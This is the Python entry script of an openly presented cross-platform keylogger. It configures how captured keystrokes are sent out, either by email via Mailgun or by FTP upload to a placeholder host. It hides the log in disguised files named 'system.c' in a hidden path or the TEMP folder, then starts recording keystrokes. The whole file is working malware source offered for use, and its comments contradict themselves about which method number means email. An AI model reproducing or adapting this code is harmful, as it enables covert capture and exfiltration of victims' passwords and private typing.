#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
import Logger

METHOD = 0				# This defines the method the keylogger will send the logs
					# Use 0 for sending an email and 1 for uploading to ftp

# If you are using 1 as method ( EMAIL ) and ignore the FTP part
RECIPIENT_EMAILS = ["recipient@*.*"] # Must be authorized by you on mailgun (Manage Authorized recipients on the control panel)
MAILGUN_API_KEY = "key-XXXXXXXXXXXXXXXXXXXXXXXXXXX" # Get it on http://www.mailgun.com/
MAILGUN_DOMAIN_NAME = "sandboxXXXXXXXXXXXXXXXXXXXXXXXX.mailgun.org" # Get it on http://www.mailgun.com/

# If you are using 0 as method ( FTP ) and ignore the EMAIL part
FTPHOST = "ftp.yourhost.com"
FTPUSER = "ftpuser"
FTPPASS = "ftppass"

"""
IMPORTANT:

If you decide to use a ftp upload method you need to change the constructor that way:

Lg = Logger.posixLogger(METHOD,FTPUSER,FTPPASS,None,deflogfile,FTPHOST)

or for windows

Lg = Logger.ntLogger(METHOD,FTPUSER,FTPPASS,None,deflogfile,FTPHOST)
"""

def main():
	# Defining a log file path
	if os.name == 'posix':					# If i'm on linux
        	deflogfile = os.getcwd()+"/.system.c"
	elif os.name == 'nt':					# If i'm on windows
        	temp_path = os.getenv('TEMP')			# Retrive TEMP directory
        	deflogfile = temp_path+"\system.c"

	if os.name == 'posix':				# Create a linux logger instance
		Lg = Logger.posixLogger(METHOD,MAILGUN_API_KEY,MAILGUN_DOMAIN_NAME,RECIPIENT_EMAILS,deflogfile)
	elif os.name == 'nt':				# Create a windows logger instance
		Lg = Logger.ntLogger(METHOD,MAILGUN_API_KEY,MAILGUN_DOMAIN_NAME,RECIPIENT_EMAILS,deflogfile)

	# Start the keylogger
	Lg.startLogging()

if __name__ == '__main__':
	main()
